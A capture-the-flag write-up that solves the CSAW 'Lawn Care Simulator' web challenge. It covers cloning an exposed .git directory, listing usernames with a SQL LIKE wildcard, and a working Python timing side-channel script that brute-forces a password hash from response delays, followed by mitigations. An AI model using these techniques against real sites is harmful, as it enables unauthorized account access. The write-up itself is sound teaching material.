## Lawn Care Simulator
Writeup by @auscompgeek.

### tl;dr
* `.git` repo was exposed
* get username through `sign_up.php` and wildcards
* use side-channel attacks to log in by brute-forcing the passhash

### Introduction
On visiting the challenge website, we are greeted with a simple game.
Let's take a peek at some of the source:

```javascript
    function init(){
        document.getElementById('login_form').onsubmit = function() {
            var pass_field = document.getElementById('password');
            pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
    };
    $.ajax('.git/refs/heads/master').done(function(version){$('#version').html('Version: ' +  version.substring (0,6))});
    initGrass();
}
```

Here, we see that passwords are *sent* to the server as MD5 hashes, and
that there's a `git` repo at `.git`.

### Exploitation
Let's clone the git repo:

```
$ git clone http://54.175.3.248:8089/.git/ lawn-care-sim
Cloning into 'lawn-care-sim'...
Done.
```

... that was simpler than I expected.

```
$ cd lawn-care-sim
$ ls
___HINT___  index.html  jobs.html  js  premium.php  sign_up.php  validate_pass.php
```

Let's take a look at these PHP files.

> `premium.php`:
```php
<?php
# [snip]
    require_once 'validate_pass.php';
    require_once 'flag.php';
    if (isset($_POST['password']) && isset($_POST['username'])) {
        $auth = validate($_POST['username'], $_POST['password']);
        if ($auth){
            echo "<h1>" . $flag . "</h1>";
        }
        else {
            echo "<h1>Not Authorized</h1>";
        }
    }
# [snip]
```

Guess we know where to find the flag now.

> `validate_pass.php`:
```php
<?
function validate($user, $pass) {
    # [snip]
    $user = mysql_real_escape_string($user);
    $query = "SELECT hash FROM users WHERE username='$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    $hash = $line['hash'];
    if (strlen($pass) != strlen($hash))
        return False;
    $index = 0;
    while($hash[$index]){
        if ($pass[$index] != $hash[$index])
            return false;
        # Protect against brute force attacks
        usleep(300000);
        $index+=1;
    }
    return true;
}
```

So `validate()` takes a username and passhash, fetches the hash from the
database, then compares each digit in the hash.

Hang on a second.  There's a call to `usleep()` in the loop.
Sounds like we'll be performing a side-channel attack to get the hash.

An important thing to note is that the length of the hashes are checked first.
When performing our attack, we'll have to pad our hash.

> `sign_up.php`:
```php
<?
# [snip]
    $user = mysql_real_escape_string($_POST['username']);
    // check to see if the username is available
    $query = "SELECT username FROM users WHERE username LIKE '$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    if ($line == NULL){
        // Signing up for premium is still in development
        echo '<h2 style="margin: 60px;">Lawn Care Simulator 2015 is currently in a private beta. Please check back later</h2>';
    }
    else {
        echo '<h2 style="margin: 60px;">Username: ' . $line['username'] . " is not available</h2>";
    }
# [snip]
```

Wait a second, `username LIKE '$user'`?  Interesting.

For those that haven't learnt SQL yet, the `LIKE` operator takes two strings,
and takes the RHS as a wildcard expression to match against the LHS.
In SQL, the equivalent wildcard for `*` is `%`.

So, this page takes a *wildcard expression* for the username, and returns a
username in the database.  Great!  Let's grab our username by passing a
username of `%`.

> ## Username: \~~FLAG~~ is not available

Now that we have a username, let's perform our side-channel attack.
In this case, our side-channel is the time it takes to respond to our HTTP
request, so attacks may be unreliable.  I try to mitigate this in various ways.

```python
#!/usr/bin/env python3
import requests
import time

EPS = 0.01

username = '~~FLAG~~'
alphabet = '0123456789abcdef'
known = ''

def try_pw(p):
    data = {'username': username, 'password': p}
    time_start = time.time()
    r = requests.post('http://54.175.3.248:8089/premium.php', data=data)
    time_end = time.time()
    return time_end - time_start, r.text

def fill_pw(p):
    return p.ljust(32, '0')

last_t = max_t = 0
max_l = None

while len(known) != 32:
    for l in alphabet:
        t, result = try_pw(fill_pw(known + l))

        # if we've already found it, just print it
        if 'Not Authorized' not in result:
            print('FOUND IT')
            print(known + l)
            print(result)
            exit()

        print(known + l, t)

        # attempt to detect network latency, etc. really badly
        # this will break if the hash has consecutive zeros in the middle
        if t - last_t < EPS:
            print('fuck')
            known = known[:-1]
            max_t = last_t = max_t / 4
            break

        if max_t < t:
            max_t, max_l = t, l

    else:
        print('adding', max_l, max_t)
        known += max_l
        last_t = max_t

# assuming the flag doesn't have "Not Authorized" in it, we shouldn't get here
print('uhm. something went wrong.')
```

I had to manually intervene a couple of times whilst running my attack,
modifying `EPS` and `known` as appropriate.

... about half an hour later:
```html
667e217660 3.2174746990203857
667e217661 3.2007336616516113
667e217662 3.207519769668579
667e217663 3.2157950401306152
667e217664 3.1841838359832764
667e217665 3.2086429595947266
FOUND IT
667e217666
<html>
<head>
    <title>Lawn Care Simulator 2015</title>
    <script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<h1>flag{gr0wth__h4ck!nG!1!1!</h1></body>
</html>
```

Our flag is `flag{gr0wth__h4ck!ng!1!1!}`.
(Note: CSAW CTF's flags are case-insensitive.)

An interesting thing to note is that this hash has a lot of trailing zeros.
I wonder whether this hash actually matches a printable string.

### Easter eggs
```
$ cat ___HINT___
Before planting grass, add compost or other soil amendment to the soil to improve its ability to hold water.
$ git log --oneline
aa3025b I think I'll just put mah source code riiiiighhhht here. Perfectly safe place for some source code.
```

### Mitigations
* If you don't want people cloning your git repo, don't make it publicly
  accessible.  Seriously, how many times have we mentioned this already?
* Don't use the SQL `LIKE` operator unless you really mean it.
* `sleep`ing is not a valid way of preventing brute-force attacks.
  :stuck_out_tongue_winking_eye:
